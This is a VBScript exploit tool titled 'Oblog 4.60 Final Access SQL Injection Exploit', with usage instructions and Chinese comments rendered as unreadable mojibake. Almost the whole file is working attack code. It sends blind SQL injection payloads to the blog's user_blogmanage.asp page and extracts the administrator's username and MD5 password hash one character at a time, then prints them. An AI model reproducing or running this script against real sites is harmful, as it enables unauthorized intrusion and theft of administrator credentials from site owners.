'============================================================================
'ʹ��˵����
' ��������ʾ���£�
' cscript.exe exp.vbs Ҫ��������վ�Ĳ���·�� id subjectid Ҫ�ƽ�Ĺ���Աid
'�磺
' cscript.exe exp.vbs http://www.xxxx.com/blog/ 840 39 1
' by Mystery
'ע��exp�Խ���д��LBS Blog All version ExploitΪģ���޸Ķ���
'============================================================================
On Error Resume Next
Dim oArgs
Dim olbsXML 'XMLHTTP����������Ŀ����ַ
Dim TargetURL 'Ŀ����ַ
Dim userid '�����û���
Dim TempStr '����ѻ�ȡ�Ĳ��� �ʺ�
Dim PwdTempStr '����ѻ�ȡ�Ĳ��� MD5����
Dim CharHex '����16�����ַ�
Dim xCharHex '����16�����ַ�
Dim charset

Set oArgs = WScript.arguments
If oArgs.count <> 4 Then Call ShowUsage()


Set olbsXML = createObject("Microsoft.XMLHTTP")

'��������Ŀ����ַ
TargetURL = oArgs(0)
If LCase(Left(TargetURL,7)) <> "http://" Then TargetURL = "http://" & TargetURL
If right(TargetURL,1) <> "/" Then TargetURL = TargetURL & "/"
TargetURL=TargetURL & "user_blogmanage.asp?t=0&usersearch=0"

articleid = oArgs(1)
subjectid = oArgs(2)
userid = oArgs(3)
TempStr=""
Userlen=""
CharHex=Split("0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f",",")
xCharHex=Split("0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z",",")

WScript.echo "==============================================================="
WScript.echo "Oblog 4.60 Final Access SQL Injection Exploit"
WScript.echo "By Mystery"
WScript.echo "http://hi.baidu.com/netstart   "
WScript.echo "==============================================================="
WScript.echo "[+] Fuck the site now"

Call GetLength(TargetURL,BlogName)

Call GetUser(TargetURL,BlogName)

Call GetPwd(TargetURL,BlogName)

Set oBokeXML = Nothing

'----------------------------------------------sub-------------------------------------------------------

'============================================
'�������ƣ�GetLength
'�������ܣ�ע����blog �û�����
'============================================
Sub GetLength(TargetURL,BlogName)
Dim LenOffset,OpenURL,xGetPage
WScript.Echo "[~] Trying to get user name length..."
For LenOffset = 1 To 20

     postdata = ""
	 postdata = " and 2=(iif((select len(username) from oblog_admin where id=" & userid & ")=" & LenOffset & ",2,'2 abc'))"
     postdata1 =""
	 postdata1 = "id=" & articleid & "&action=move&chksubjectid=2&chkclassid=1&classid=1&subjectid=" & subjectid & escape(postdata)
    
     OpenURL = TargetURL

olbsXML.open "Post",OpenURL, False, "", ""
     olbsXML.setRequestHeader "Content-Type","application/x-www-form-urlencoded"
olbsXML.send postdata1
xGetPage = BytesToBstr(olbsXML.ResponseBody)
'�жϷ��ʵ�ҳ���Ƿ����
     'WScript.echo xGetPage
If InStr(xGetPage,"����ϵͳ����ɹ�")<>0 Then 
Userlen=LenOffset
Exit For
ElseIf InStr(GetPage,"Microsoft VBScript ����ʱ����")<>0 Then
WScript.echo vbcrlf & "Something error,Not vul" & vbcrlf 
WScript.Quit
End If 
Next
WScript.Echo "[+] length��" & Userlen 
WScript.Echo "[~] Trying to Crack..."
End sub



'============================================
'�������ƣ�GetUser
'�������ܣ�ע����blog �û��ʺ�
'============================================
Sub GetUser(TargetURL,BlogName)
Dim yMainOffset,ySubOffset,TempLen,OpenURL,yGetPage,xLen
xLen = UserLen
For yMainOffset = 1 To Userlen
For ySubOffset = 0 To ubound(xCharHex)
TempLen = 0
     postdata = ""
	 postdata = " and 2=(iif((select left(username,"&yMainOffset&") from oblog_admin where id=" & userid & ")='" & TempStr&xCharHex(ySubOffset) & "',2,'2 abc'))"
     postdata1 =""
	 postdata1 = "id=" & articleid & "&action=move&chksubjectid=2&chkclassid=1&classid=1&subjectid=" & subjectid & escape(postdata)
    
     OpenURL = TargetURL

olbsXML.open "Post",OpenURL, False, "", ""
     olbsXML.setRequestHeader "Content-Type","application/x-www-form-urlencoded"
olbsXML.send postdata1
GetPage = BytesToBstr(olbsXML.ResponseBody)
If InStr(GetPage,"����ϵͳ����ɹ�")<>0 Then 
TempStr=TempStr & xCharHex(ySubOffset)
WScript.Echo "[+] Crack now��"&TempStr &String(xLen-yMainOffset, "?")
Exit For
ElseIf InStr(GetPage,"Microsoft VBScript ����ʱ����")<>0 Then
WScript.echo vbcrlf & "Something error,Not vul" & vbcrlf 
WScript.Quit
End If 
next
Next
End sub

'============================================
'�������ƣ�GetPwd
'�������ܣ�ע����blog �û�����
'============================================
Sub GetPwd(TargetURL,BlogName)
Dim MainOffset,SubOffset,TempLen,OpenURL,GetPage
For MainOffset = 1 To 16
For SubOffset = 0 To 15
TempLen = 0
     postdata = ""
	 postdata = " and 2=(iif((select left(password,"&MainOffset&") from oblog_admin where id=" & userid & ")='" & PwdTempStr&CharHex(SubOffset) & "',2,'2 abc'))"
     postdata1 =""
	 postdata1 = "id=" & articleid & "&action=move&chksubjectid=2&chkclassid=1&classid=1&subjectid=" & subjectid & escape(postdata)
    
     OpenURL = TargetURL

olbsXML.open "Post",OpenURL, False, "", ""
     olbsXML.setRequestHeader "Content-Type","application/x-www-form-urlencoded"
olbsXML.send postdata1
GetPage = BytesToBstr(olbsXML.ResponseBody)
If InStr(GetPage,"����ϵͳ����ɹ�")<>0 Then 
PwdTempStr=PwdTempStr & CharHex(SubOffset)
WScript.Echo "[+] Crack now��"&PwdTempStr &String(16-MainOffset, "?")
Exit For
ElseIf InStr(GetPage,"Microsoft VBScript ����ʱ����")<>0 Then
WScript.echo vbcrlf & "Something error,Not vul" & vbcrlf 
WScript.Quit
End If 
next
Next
WScript.Echo vbcrlf& "[+] We Got It��" & vbcrlf & "[username]: " & TempStr & vbcrlf & "[password]: " & PwdTempStr & vbcrlf &vbcrlf&":P Don't Be evil"
End sub


'============================================
'�������ƣ�BytesToBstr
'�������ܣ���XMLHTTP�����е�����ת��ΪGB2312����
'============================================
Function BytesToBstr(body)
dim objstream
set objstream = createObject("ADODB.Stream")
objstream.Type = 1
objstream.Mode =3
objstream.Open
objstream.Write body
objstream.Position = 0
objstream.Type = 2
objstream.Charset = "GB2312"
BytesToBstr = objstream.ReadText
objstream.Close
set objstream = nothing
End Function

'============================
'�������ƣ�ShowUsage
'�������ܣ�ʹ�÷�����ʾ
'============================
Sub ShowUsage()
WScript.echo "Oblog 4.60 Final Access SQL Injection Exploit" & vbcrlf & "By Mystery"
WScript.echo "Usage:"& vbcrlf & " CScript " & WScript.ScriptFullName &" TargetURL id subjectid userid"
WScript.echo "Example:"& vbcrlf & " CScript " & WScript.ScriptFullName &" http://www.xxxx.com/blog/ 840 39 1"
WScript.echo ""
WScript.Quit
End Sub
